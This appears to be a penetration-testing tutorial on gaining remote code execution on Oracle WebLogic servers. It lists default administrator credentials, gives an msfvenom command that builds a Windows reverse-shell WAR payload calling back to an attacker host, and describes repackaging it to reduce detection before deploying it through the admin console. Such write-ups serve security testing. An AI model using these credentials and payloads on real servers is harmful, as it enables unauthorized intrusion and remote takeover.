title: Authenticated RCE in Weblogic Servers

Weblogic servers are popular in pentests as outdated versions have RCE vulnerabilities with public exploits. However, you can exploit them uploading WAR files as well.

## Getting access to Weblogic Server

You may find a version of WebLogic Administration Console interface affected by vulnerabilities such as CVE-2020-14882, but it is not always possible to exploit them because of network or system restrictions.

Nevertheless, you can get access by obtaining admin credentials and uploading a malicious application. Some of the default credentials are:

- weblogic:Welcome1

- weblogic:weblogic

- system:weblogic

It usually runs in port 7001 but you can find it in any port.


## Creating WAR file

If you know there are no antivirus or EDR running in the system or you do not care about being detected, you can try uploading a WAR file generated with msfvenom using the parameter "-f war":

```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > malicious.war
```

This is not the stealthiest method but we can use this file to generate a better WAR file, by decompressing it (it is like a zip file), update the files and compress it again later. The file structure is the following:

- META-INF/MANIFEST.MF
- WEB-INF/web.xml
- evxanqiqlxbhun.jsp

The only thing you should see different is the JSP file name.

We will change the random characters in "web.xml":

![img](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/weblogic/2.png)

And the JSP name to "index.jsp". If we remove the line 3 in the file, we can add any non-malicious code to test the JSP code is executed.

Then we create a WAR compressed file:

## Upload malicious WAR file

To upload the file and deploy the malicious application we can follow [this IBM guide](https://www.ibm.com/docs/en/control-desk/7.6.0.2?topic=scenario-deploy-application-files-oracle-weblogic-server).

We must access the web interface and click "Lock & Edit" and then "Deployments" link in the "Domain Structure" section.

It is possible to execute JSP code so now we can create a new WAR file containing a cmdshell, such as [this one](https://gist.github.com/nikallass/5ceef8c8c02d58ca2c69a29a92d2f461).
